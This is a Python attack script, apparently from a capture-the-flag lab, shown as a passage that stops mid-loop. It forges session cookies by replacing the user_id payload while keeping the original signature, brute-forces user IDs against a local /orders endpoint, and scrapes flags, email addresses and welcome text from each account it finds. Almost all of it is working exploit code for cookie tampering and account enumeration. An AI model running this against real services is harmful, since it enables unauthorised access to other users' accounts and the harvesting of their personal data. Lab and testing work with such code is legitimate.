import requests
import base64
import json
import re

# Cookie components
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Brute-forcing user IDs to find valid accounts\n")
print("Testing range: 1-200 and 10000-10100\n")

valid_users = []
orders_data = {}

# Test multiple ranges to find valid accounts
ranges_to_test = [
    (1, 201, 1),      # Low IDs
    (1000, 1101, 1),  # Around 1000
    (9990, 10101, 1), # Around 10000
    (10030, 10050, 1) # Around the known ID 10032
]

for start, end, step in ranges_to_test:
    print(f"[*] Testing range {start}-{end-1}...")
    for user_id in range(start, end, step):
        test_payload = {"user_id": user_id}
        payload_str = json.dumps(test_payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
        tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
        headers = {'Cookie': f'session={tampered_cookie}'}
        
        try:
            response = requests.get('http://127.0.0.1:33198/orders', headers=headers, timeout=3)
            
            # Save response data
            orders_data[user_id] = {
                'length': len(response.text),
                'status': response.status_code
            }
            
            # Check if this is a valid user (not redirected to login)
            if len(response.text) > 2000:  # Valid user has full orders page (>2KB)
                print(f"[!] VALID USER FOUND: user_id={user_id} | Length: {len(response.text)}B")
                valid_users.append(user_id)
                
                # Extract and display interesting data
                flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                if flags:
                    print(f"    [FLAGS] {flags}")
                
                # Look for email, username, order details
                emails = re.findall(r'[\w\.%+-]+@[\w\.-]+\.[A-Za-z]{2,}', response.text)
                if emails:
                    print(f"    [EMAILS] {emails}")
                
                # Show first part of response
                welcome = re.search(r'Welcome[^<]{0,100}', response.text)
                if welcome:
                    print(f"    [WELCOME] {welcome.group(0).strip()}")
                
